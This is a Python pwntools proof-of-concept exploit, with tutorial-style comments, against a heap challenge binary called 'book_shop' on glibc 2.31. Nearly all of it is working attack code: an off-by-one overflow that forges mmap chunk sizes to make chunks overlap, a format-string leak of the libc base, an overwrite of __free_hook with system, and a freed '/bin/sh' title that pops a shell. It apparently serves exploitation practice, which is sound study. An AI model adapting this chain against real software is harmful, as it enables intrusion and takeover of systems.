'''
Mmap chunk Full POC
This POC should work on all versions of libc. But, the LibC specific version for this is 2.31

Breaks: 
- Buffer overflow (vulneability) 
- Overlapping chunks 
- Leak 
- Arbitrary Write
- Pop shell (this and the one prior could be the same)
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.31/libc-2.31.so'
env = {}

# Binary setup
elf_name = 'book_shop'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(["../../libc_versions/2.31/ld-2.31.so", elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.31
''')
else: 
	p = remote(domain, port) 


# Create a book
def create_book(name, author, pages): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("book:", str(pages)) 
	p.sendlineafter("Title:", str(name)) 
	p.sendlineafter("Author:", str(author))
	return 

# Write a page
def write_page(book_no, page_no, content): 
	p.sendlineafter(">", "2") 
	p.sendlineafter("No:", str(book_no))
	p.sendlineafter("write:", str(page_no))
	p.sendlineafter("page:", str(content))

# Publish a book (free it) 
def publish(book_no):
	p.sendlineafter(">", "4") 
	p.sendlineafter("No:", str(book_no))

# View a book
def view(book_no, page_no): 
	p.sendlineafter(">", "3") 
	p.sendlineafter("No:", str(book_no))
	p.sendlineafter("view:", str(page_no))

	# Parse out the book and content
	p.recvuntil("of ") 
	book_name = p.recvline()
	content = p.recvuntil("Large")[:-5]
	return book_name, content


''' 
LibC leak with format string
===========================

The content section of a print does not use a format string properly. 
For more information on format string vulnerabilities, please visit 
https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be. 
'''
def leak(): 
	# At the beginning of this function, index 1 and index are overlapping

	# Offset from leaked address to libc base
	offset = 0x44020

	''' 
	Add a format string to leak information that is on the stack 	
	The format string identifier 'llx' is used because we want to 
	print out a whole pointer (long long hex). 
	'''	
	print "Write format string to content"
	write_page(2, 2, "%llx " * (1000/5))

	print "Exploit format string vuln"
	# View the section with the format string vulnerability
	_, content_leak = view(2,2)  
	
	# Parse out content and get LibC Base
	content_leak = content_leak.split(" ") 
	libc_leak = content_leak[1]
	libc_leak = int("0x" + libc_leak, 16) 	
	libc_base = libc_leak + offset

	print "LibC Leak: ", hex(libc_leak)
	print "Libc Base: ", hex(libc_base) 
	return libc_base

'''
Overlapping mmap chunks via buffer overflow
==========================================

Mmap Basics
===============
Extremely large chunks (greater than 128 * 1024 to start) 
are not handled in the normal ways. All of the 'books' are
going to be of very large sizes. 

Very large chunks are allocated via a straight call to 
the syscall mmap. Similarly, munmap is used for freeing. The
second bit (| 0x2) is for marking if a chunk was mmapped.

Size and Prev Size fields are handled slightly differently. 
The size is the same. However, the prev_size field is used 
as the leftover data of a given chunk from mmap (on the 
current chunk). Mmap chunks are NOT handled in bins. 

Mmap chunks grow downards in memory (in terms of WHERE a chunk gets
placed at. 

Vulnerability
===============
The buffer overflows exists because of an off by 1 error in the 
source code for the page to write to. This allows for the size 
and prev_size to be overwritten of an mmap chunk.

Overlapping Chunks
==================
This is pretty similar to before, but with less sanity checks. 
There is only one criteria that must be met on a free: prev_size
+ size is equvalient to multiple of a page. 

'''	
def overlap_chunks():

	# Size of the chunks that are being used here
	size = 0x21000

	# Creates two books
	create_book("A" * 8, "B" * 8, 32)
	create_book("C" * 8, "D" * 8, 32) 

	'''
	Heap Setup
	============
	chunk1 (0x21000) 
	chunk0 (0x21000) 
	============

	Free both index 0 chunk and index 1 chunk
	This is done by overriding the chunk prev_size 
	of the index 0 chunk to INCLUDE the index 1 chunk. 

	So, when this is freed, both of these chunks are 
	munmapped.
	'''
	fake_chunk = "I" * 0x20 # Filler
	fake_chunk += p64(size)  # Prev Size -- Overlaps with previous chunk
	fake_chunk += p64(size | 2)  # Size 

	print "Overwriting prev_size of chunk 0"
	# Write to the chunk 0 metdata of the size and prev_size
	write_page(1, 32, fake_chunk)

	print "Munmap both chunk 0 and chunk 1"
	# Munmap chunk 0 and 1
	# Now, chunk 1 has a pointer pointing to the memory was munmapped
	publish(0)
	
	print "Pointer on chunk 1 while memory is not mapped"

	''' 
	Put this chunk at the location of chunk 0, 1.
	Because mmap memory grows downwards (with each allocation) 
	we need to include two extra pages. So is so that we have the 
	'content' pointer of a book struct be writtable. This is how
	the memory will look: 
	===================	
	0x0 chunk1 ptr
	....
	content ptr
	===================
	
	If we allocate MORE from malloc, then the ptr will be put 
	UNDER this. For instance, look at the following: 
	==================
	-0x1000 chunk2 ptr (0x45000)
	0x0 chunk1 ptr 
	...
	content ptr
	=================
	
	Now, we can WRITE to the location of the content ptr with 
	the overlapping chunk.
	'''	
	create_book("G" * 8, "H" * 8, 32 * 2 + 2) 
	print "Allocate over the top of chunk 1"
	return 

# Creates the ability to write to anywhere in memory via ptr overwrite
def arbitrary_write(libc_base):

	free_hook_offset = 0x1b3b28
	
	# Create the arbitary write primative :)
	content = "I" * 0xff0 # Filler 
	content += "J" * 8 # The amount of pages  (Just a HUGE page count)

	# Calculate the address to write to at __free_hook
	free_hook_addr = libc_base + free_hook_offset
	content += p64(free_hook_addr) 

	''' 
	Setup the write primative to __free_hook by overwriting 
	pointer on index 1's chunk 'content' ptr. 
	'''
	print("Calculate __free_hook: ", hex(free_hook_addr) ) 
	print "Overwrite book->content pointer with __free_hook"
	write_page(2, 0, content) 
	return 	

def overlap_chunks1():

	# Size of the chunks that are being used here
	size = 0x21000

	create_book("A" * 8, "B" * 8, 32)
	create_book("C" * 8, "D" * 8, 32) 
	create_book("E" * 8, "F" * 8, 32) 

	# Overwrite the chunk with a new size and prev_size
	fake_chunk = "1" * 0x20 # Filler
	fake_chunk += p64(0x0)  # Prev Size
	fake_chunk += p64(size + size | 2)  # Size 
	write_page(2, 32, fake_chunk) # Index 32 in out of bounds (off by 1)

	# Remove chunk 0 and 1
	publish(1)

	# Put this chunk at the location of chunk 0, 1 and 2. 
	create_book("G" * 8, "H" * 8, 32 * 2 + 3)

	# Chunk 1 is possible to use but is freed. 
	# The just allocated chunk is overlapping with this


def pop_shell(libc_base): 
	system_offset = 0x459e7
	
	'''
	Write the address of system to __free_hook.

	The free hook is super nice because the first parameter 
	of 'free' is the address of the chunk.

	The beginning of the address is just the 'title', which 
	we control!

	Put '/bin/sh' at the title for when system is called
	'''
	create_book("/bin/sh\x00", "L" * 8, 32 * 2 + 2) 	

	'''
	Write to __free_hook with the address of system (see 
	arbitrary_write function for the reasoning behind this
	'''
	print "Write address of system to __free_hook"
	write_page(1, 0, p64(libc_base + system_offset))

	print "Free chunk with /bin/sh as the title"
	print "Pop shell :)"
	# Call free, with the title as '/bin/sh' to trigger system!
	publish(3)


print "Starting Mmap Chunk Overlapping...." 
print "===================================="
overlap_chunks()
libc_base = leak()
arbitrary_write(libc_base) 
pop_shell(libc_base)

p.interactive()


